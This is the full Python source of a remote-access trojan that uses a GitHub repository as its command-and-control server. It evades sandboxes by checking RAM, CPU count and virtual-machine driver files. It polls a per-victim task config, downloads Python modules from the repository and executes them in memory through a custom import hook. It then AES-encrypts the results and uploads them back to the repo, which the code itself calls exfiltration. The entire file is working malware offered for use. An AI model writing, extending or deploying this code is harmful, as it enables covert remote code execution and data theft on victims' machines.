import json
import base64
import sys
import time
import random
import threading
import hashlib
import queue
import os
import uuid
import ctypes
import platform
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import psutil
from dotenv import load_dotenv
import importlib.abc
import importlib.util
from github3 import login

if getattr(sys, 'frozen', False):
    basedir = sys._MEIPASS
else:
    basedir = os.path.dirname(os.path.abspath(__file__))

load_dotenv(os.path.join(basedir, 'env'), override=True)
GH_TOKEN = os.getenv("GH_TOKEN")
REPO_NAME = os.getenv("REPO_NAME", "win_trojan")
USER_NAME = os.getenv("USER_NAME", "Noah-school")
encryption_key_str = os.getenv("ENCRYPTION_KEY", "Sixteen byte key").strip()
ENCRYPTION_KEY = encryption_key_str.encode()

key_hash = hashlib.sha256(ENCRYPTION_KEY).hexdigest()[:8]
print(f"[*] Key Diagnostic: Length={len(ENCRYPTION_KEY)} bytes, VerifyHash={key_hash}")

class Trojan:
    def __init__(self, id=None):
        self.cid_file = ".cid"
        self.id = self.get_id()
        self.config_file = f"config/{self.id}.json"
        self.data_path = f"data/{self.id}/"
        self.repo = None
        self.branch = "main"

    def get_id(self):
        if os.path.exists(self.cid_file):
            with open(self.cid_file, "r") as f:
                return f.read().strip()
        
        new_id = str(uuid.uuid4())[:8]
        with open(self.cid_file, "w") as f:
            f.write(new_id)
        return new_id

    def connect_to_github(self):
        print(f"[*] Attempting to connect to GitHub...")
        print(f"[*] Config: USER={USER_NAME}, REPO={REPO_NAME}")
        
        if not GH_TOKEN:
            print("Error: GH_TOKEN environment variable not set.")
            sys.exit(1)
        
        masked_token = GH_TOKEN[:4] + "..." + GH_TOKEN[-4:] if len(GH_TOKEN) > 8 else "***"
        print(f"[*] Using token: {masked_token}")
        
        try:
            gh = login(token=GH_TOKEN)
            self.repo = gh.repository(USER_NAME, REPO_NAME)
            
            if not self.repo:
                print(f"Error: Could not find repository {USER_NAME}/{REPO_NAME}")
                sys.exit(1)
            
            print(f"Connected to {USER_NAME}/{REPO_NAME} as client {self.id}")
        except Exception as e:
            print(f"Error during GitHub connection: {e}")
            sys.exit(1)

    def get_file_contents(self, filepath):
        try:
            file_content = self.repo.file_contents(filepath)
            if file_content:
                return base64.b64decode(file_content.content)
        except Exception:
            pass
        return None

    def is_sandbox(self):
        try:
            if psutil.virtual_memory().total < (2 * 1024 * 1024 * 1024): # < 2GB
                return True
        except: pass

        try:
            if psutil.cpu_count() < 2:
                return True
        except: pass

        if platform.system() == "Windows":
            vm_files = [
                r"C:\windows\System32\Drivers\VBoxMouse.sys",
                r"C:\windows\System32\Drivers\vmmouse.sys",
                r"C:\windows\System32\Drivers\vboxguest.sys"
            ]
            for f in vm_files:
                if os.path.exists(f): 
                    return True
        return False

    def register(self):
        try:
            if not self.get_file_contents(self.config_file):
                self.repo.create_file(self.config_file, f"Init {self.id}", b"[]")
            self.store_result("system", "Agent initialized")
        except Exception: pass

    def run(self):
        if self.is_sandbox():
            print("[!] Sandbox detected. Exiting.")
            sys.exit(0)
            
        self.connect_to_github()
        self.register()
        while True:
            config = self.get_config()
            for task in config:
                t = threading.Thread(target=self.module_runner, args=(task['module'], task['args']))
                t.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30, 60))

    def get_config(self):
        config_json = self.get_file_contents(self.config_file)
        if config_json:
            return json.loads(config_json)
        return []

    def module_runner(self, name, args):
        try:
            exec(f"import {name}")
            module = sys.modules[name]
            result = module.run(**args)
            self.store_result(name, result)
        except Exception as e:
            print(f"[*] Error running module {name}: {e}")

    def store_result(self, module_name, data):
        data_bytes = str(data).encode()
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data_bytes, AES.block_size))
        combined = base64.b64encode(cipher.iv + ct_bytes)
        remote_path = f"{self.data_path}{module_name}/{time.time()}.enc"
        print(f"[*] Exfiltrating encrypted data from {module_name}...")
        self.repo.create_file(remote_path, f"Result from {module_name}", combined)

class GitImporter(importlib.abc.MetaPathFinder):
    def __init__(self, trojan):
        self.trojan = trojan

    def find_spec(self, fullname, path, target=None):
        if fullname in ["requests", "github3", "psutil", "dotenv", "pynput", "pyautogui", "scapy", "PIL", "Crypto"]:
            return None
        if not self.trojan.repo:
            return None
        print(f"[*] MetaPath: Searching for module {fullname} on GitHub...")
        module_code = self.trojan.get_file_contents(f"modules/{fullname}.py")
        if module_code:
            print(f"[+] Found {fullname} on GitHub. Creating spec...")
            return importlib.util.spec_from_loader(fullname, GitLoader(fullname, module_code))
        return None

class GitLoader(importlib.abc.Loader):
    def __init__(self, fullname, code):
        self.fullname = fullname
        self.code = code
    def create_module(self, spec):
        return None
    def exec_module(self, module):
        print(f"[*] Executing module {self.fullname} from memory...")
        exec(self.code, module.__dict__)

if __name__ == "__main__":
    trojan = Trojan()
    sys.meta_path.append(GitImporter(trojan))
    trojan.run()
